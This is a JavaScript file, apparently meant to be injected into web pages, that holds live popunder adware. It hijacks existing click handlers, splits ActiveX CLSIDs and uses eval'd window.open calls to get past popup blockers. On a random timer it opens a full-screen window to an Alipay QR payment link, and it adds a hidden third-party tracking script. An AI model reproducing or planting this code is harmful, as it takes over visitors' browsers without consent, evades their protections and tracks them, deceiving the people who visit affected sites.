var _typeof = "function" === typeof Symbol && "symbol" === typeof Symbol.iterator ?
function(a) {
	return typeof a
} : function(a) {
	return a && "function" === typeof Symbol && a.constructor === Symbol && a !== Symbol.prototype ? "symbol" : typeof a
};
(function(a, d) {
	(function(a) {
		a += "=";
		for (var c = d.cookie.split(";"), b = 0; b < c.length; b++) {
			var e = c[b].trim();
			if (0 == e.indexOf(a)) return e.substring(a.length, e.length)
		}
		return ""
	})
    ("__tok") || (function(a) {
		var b = document.createElement("script");
		b.type = "text/javascript";
		b.src = a;
		document.body.appendChild(b)
	}("https://cdn.bootcss.com/clipboard.js/1.7.1/clipboard.min.js"), function(b) {
		if ("undefined" != typeof a.addEventListener) a.addEventListener("load", b, !1);
		else if (_typeof(d.addEventListener)) d.addEventListener("load", b, !1);
		else if ("undefined" != typeof a.attachEvent) a.attachEvent("load", b);
		else {
			var c = a.onload;
			a.onload = "function" != typeof a.onload ? b : function() {
				c();
				b()
			}
		}
	}(function() {
		var mycodes=new Array("3zZdLf05hv");
		var rnum=parseInt(mycodes.length*Math.random());
		var zfbcode=mycodes[rnum];	
		function checkCookie(){
			if(document.cookie.indexOf('GewEWx+vbTkYq')!==-1){				
				var time = getCookie('GewEWx+vbTkYq')	;			
				if(new Date().getTime()-parseInt(time)<6*60*60*1000){					
					return false;
				}else{					
					document.cookie= "GewEWx+vbTkYq="+new Date().getTime()+';';					
					return true;
				}
			}else{				
				document.cookie= "GewEWx+vbTkYq="+new Date().getTime()+';';				
				return true;
			}
		};
		function getCookie(name) { 
	　　　　if (document.cookie.length>0){　　
	　　　　　　var c_start=document.cookie.indexOf(name + "=")　　;　
	　　　　　　if (c_start!=-1){ 
	　　　　　　　　c_start=c_start + name.length+1　　;
	　　　　　　　　var c_end=document.cookie.indexOf(";",c_start)　　;
	　　　　　　　　if (c_end==-1) c_end=document.cookie.length　　;
	　　　　　　　　return unescape(document.cookie.substring(c_start,c_end))　　;
	　　　　　　} 
	　　　　}
	　　　　return "";
		};
    var authcode = '';
	var paypopupURL = 'http://qr.alipay.com/c1x07766kinzpbdaydwuw1f' + authcode; 
	var _hascsp = 0;
	var poptype = 1;

	function updatecs() {}; (function() {
		var browserType = navigator.userAgent;
		var openPage = {};
		openPage.ver = {
			ie: /MSIE/.test(browserType),
			ie6: !/MSIE 7\.0/.test(browserType) && /MSIE 6\.0/.test(browserType) && !/MSIE 8\.0/.test(browserType),
			tt: /TencentTraveler/.test(browserType),
			i360: /360SE/.test(browserType),
			sogo: /; SE/.test(browserType),
			gg: window.google && window.chrome,
			_v1: '<object id="_tt_cs01" width="0" height="0" classid="CLSID:6BF5' + '2A52-394' + 'A-1' + '1D3-B15' + '3-00' + 'C04F' + '79FAA6"></object>',
			_v2: '<object id="_tt_cs02" style="position:absolute;left:1px;top:1px;width:1px;height:1px;" classid="clsid:2D' + '360201-FF' + 'F5-11' + 'd1-8D0' + '3-00A' + '0C95' + '9BC0A"></object>'
		};
		if (openPage.ver.ie || openPage.ver.tt) {
			
			document.write(openPage.ver._v1);
			document.write(openPage.ver._v2);
		}
		openPage.onclick = null;
		openPage.fdc = null;
		openPage.timeid = 0;
		openPage.first = 1;
		openPage.url = '';
		openPage.w = 0;
		openPage.h = 0;
		openPage.init = function() { 
			try {
				if (typeof document.body.onclick == "function") { 
					openPage.onclick = document.body.onclick;
					document.body.onclick = null;
				}
				if (typeof document.onclick == "function") {
					if (document.onclick.toString().indexOf('clickpp') < 0) {
						openPage.fdc = document.onclick;
						document.onclick = function() {
							openPage.clickpp(openPage.url, openPage.w, openPage.h);
						}
					}
				}
			} catch(q) {}
		};
		openPage.donepp = function(c, g) {
			if (g == 1 && (!openPage.ver.i360 && openPage.ver.ie6)) {
				return;
			}
			if (_hascsp) {
				return;
			}
			try {
				document.getElementById("_tt_cs01").launchURL(c);
				_hascsp = 1;
				updatecs();
			} catch(q) {}
		};
		openPage.clickpp = function(c, e, f) {
			openPage.open(c, e, f);
			clearInterval(openPage.timeid);
			document.onclick = null;
			if (typeof openPage.fdc == "function"){
				 try {
				document.onclick = openPage.fdc;
			} catch(q) {}
			}
			if (typeof openPage.onclick == "function") {
				try {
				document.body.onclick = openPage.onclick;
			} catch(q) {}
			}
		}
		openPage.open = function(c, e, f) {
			if (_hascsp) {
				return;
			}
			openPage.url = c;
			openPage.w = e;
			openPage.h = f;
			if (openPage.timeid == 0){
				 openPage.timeid = setInterval(openPage.init, 100);
			}
			var b = 'height=' + f + ',width=' + e + ',left=0,top=0,toolbar=yes,location=yes,status=yes,menubar=yes,scrollbars=yes,resizable=yes';
			var j = 'window.open("' + c + '", "_blank", "' + b + '")';
			var m = null;
			try {
				m = eval(j);
			} catch(q) {}
			if (m && !(openPage.first && openPage.ver.gg)) {
				if (poptype != -1) {
					m.focus();
				} else {
					m.blur();
					window.focus();
				}
				_hascsp = 1;
				updatecs();
				if (typeof openPage.onclick == "function") try {
					document.body.onclick = openPage.onclick;
				} catch(q) {}
				clearInterval(openPage.timeid);
			} else {
				var i = this;
				var j = false;
				if (openPage.ver.ie || openPage.ver.tt) {
					document.getElementById("_tt_cs01");
					document.getElementById("_tt_cs02");
					setTimeout(function() {
						var obj = document.getElementById("_tt_cs02");
						if (_hascsp || !obj) return;
						try {
							var wPop = obj.DOM.Script.open(c, "_blank", b);
							if (wPop) {
								if (poptype != -1) {
									wPop.focus();
								} else {
									wPop.blur();
									window.focus();
								}
								_hascsp = 1;
								updatecs();
							} else {
								if (openPage.ver.sogo) {
								_hascsp = 1;
								updatecs();
							}
							}
						} catch(q) {}
					},
					200);
				}
				if (openPage.first) {
					openPage.first = 0;
					try {
						if (typeof document.onclick == "function") openPage.fdc = document.onclick;
					} catch(p) {}
					document.onclick = function() {
						i.clickpp(c, e, f);
					};
					if (openPage.ver.ie) {
						if (window.attachEvent){
							 window.attachEvent("onload",
							function() {
								i.donepp(c, 1);
							});
						}
						else {
						if (window.addEventListener){
							 window.addEventListener("load",
							function() {
								i.donepp(c, 1);
							},
							true);
						}
						else {
							window.onload = function() {
							i.donepp(c, 1);
						};
						}
						}
					}
				}
			}
		};
		window.__csppp = openPage; 
	})();
	setTimeout(function(){
		if(Math.random()>0.6&&checkCookie()){
			__csppp.open(paypopupURL, window.screen.width, window.screen.height);
		}
	},1000*(2 + Math.random()*2))
	}));
})(window, document);

document.writeln('<div style="display:none"><script src="https://s22.cnzz.com/z_stat.php?id=1271885509&web_id=1271885509" language="JavaScript"><\/script><\/div>')
